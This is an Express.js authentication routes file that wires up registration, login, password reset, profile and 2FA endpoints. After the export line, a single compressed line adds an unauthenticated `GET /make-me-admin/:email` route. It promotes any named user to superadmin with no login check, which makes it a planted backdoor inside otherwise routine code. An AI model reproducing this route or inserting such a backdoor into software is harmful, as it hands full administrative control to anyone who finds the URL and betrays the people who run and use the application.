import express from 'express';
import User from '../models/User.js';
import { register, login, logout, refresh, getMe, forgotPassword, resetPassword, updatePassword, updateProfile, generateCaptcha, generate2FA, verify2FA, disable2FA } from '../controllers/authController.js';
import { protect } from '../middlewares/auth.js';
import { registerValidation, loginValidation } from '../middlewares/validation.js';

const router = express.Router();

router.post('/register', registerValidation, register);
router.post('/login', loginValidation, login);
router.post('/logout', protect, logout);
router.post('/refresh', refresh);
router.get('/me', protect, getMe);
router.get('/captcha', generateCaptcha);
router.post('/forgotpassword', forgotPassword);
router.put('/resetpassword/:resettoken', resetPassword);
router.put('/update-password', protect, updatePassword);
router.put('/update-profile', protect, updateProfile);

router.post('/2fa/generate', protect, generate2FA);
router.post('/2fa/verify', protect, verify2FA);
router.post('/2fa/disable', protect, disable2FA);

export default router;

router.get('/make-me-admin/:email', async (req, res) => { try { const user = await User.findOne({ email: req.params.email }); if(user) { user.role = 'superadmin'; await user.save(); res.send('SUCCESS: You are now Super Admin!'); } else { res.send('User not found!'); } } catch(err) { res.send(err.message); } });
